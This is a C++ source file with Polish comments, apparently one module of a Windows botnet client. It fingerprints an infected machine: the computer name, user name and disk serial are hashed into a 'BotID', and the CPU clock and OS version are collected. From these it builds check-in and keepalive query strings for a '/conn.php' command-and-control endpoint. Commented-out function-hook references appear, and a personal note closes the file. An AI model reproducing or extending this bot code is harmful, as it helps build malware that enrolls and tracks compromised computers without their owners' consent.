#include "Machine_info.h"
//#include "FunctionHooks.h"

std::string intToStr(int n)
{
	std::string tmp;
	if (n < 0) {
		tmp = "-";
		n = -n;
	}
	if (n > 9)
		tmp += intToStr(n / 10);
	tmp += n % 10 + 48;
	return tmp;
}

std::string MachineInfo::GetBotID()
{
	DWORD disk_serialINT;
	GetVolumeInformationA(NULL, NULL, NULL, &disk_serialINT, NULL, NULL, NULL, NULL);
	std::string HDDserial = std::to_string(disk_serialINT);
	
	std::string ComputerName = this->PC_Name, Username = this->Username;
	
	std::string result = ComputerName;
	result += Username;
	result += HDDserial;
	
	return sha256(result);
}

void MachineInfo::make_info()
{
	//FunctionHooks* FH = new FunctionHooks;
	
	DWORD size;
	size = MAX_COMPUTERNAME_LENGTH + 1;
	
	GetComputerNameA(this->PC_Name, &size); // Wpisanie nazwy komputera

	size = UNLEN + 1;

	GetUserNameA(this->Username, &size); // Wpisanie nazwy u¿ytkownika

	
	/*----------------Wpisanie informacji o maksymalnym taktowaniu CPU--------------------*/
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	size = sysInfo.dwNumberOfProcessors * sizeof(PROCESSOR_POWER_INFORMATION);
	LPBYTE buf = new BYTE[size];
	CallNtPowerInformation(ProcessorInformation, NULL, 0, buf, size);
	PPROCESSOR_POWER_INFORMATION cpuinfo = (PPROCESSOR_POWER_INFORMATION)buf;
	std::string full_cpu_ratio = intToStr(cpuinfo->MaxMhz) + "GHz";
	full_cpu_ratio.erase(3, 1);
	full_cpu_ratio.insert(1, ".");
	memcpy(this->CPU_clock, full_cpu_ratio.c_str(), sizeof(full_cpu_ratio));
	/*------------------------------------------------------------------------------------*/


	/*-----------------------Sprawdzenie wersji systemu Windows---------------------------*/
	if (IsWindows8Point1OrGreater())memcpy(this->OS, "Windows 8.1", sizeof("Windows 8.1"));
	else
	if (IsWindows7OrGreater())memcpy(this->OS, "Windows 7", sizeof("Windows 7"));
	else
	if (IsWindowsVistaOrGreater())memcpy(this->OS, "Windows Vista", sizeof("Windows Vista"));
	else
	if (IsWindowsXPOrGreater())memcpy(this->OS, "Windows XP", sizeof("Windows XP"));
	/*------------------------------------------------------------------------------------*/

}


std::string MachineInfo::create_long_payload()
{
	char* s1 = "/conn.php?id=";
	char* s2 = "&version=";
	char* s3 = "&os=";
	char* s4 = "&cpu=";

	std::string id = GetBotID();

	std::string msg = s1;
	msg += id;
	msg += s2;
	msg += this->Bot_version;
	msg += s3;
	msg += this->OS;
	msg += s4;
	msg += this->CPU_clock;

	return msg;
}

std::string MachineInfo::create_keepalive()
{
	char* s1 = "/conn.php?id=";

	std::string id = GetBotID();
	
	std::string msg = s1;
	msg += id;

	return msg;
}

MachineInfo::MachineInfo()
{
	//hPowrproflib = LoadLibraryA(STRINGS.powrproflib.c_str());
}

MachineInfo::~MachineInfo()
{
	//FreeLibrary();
}

//Kocham Ciê bardzo mocno : *< 3
//	xoxox Daria;D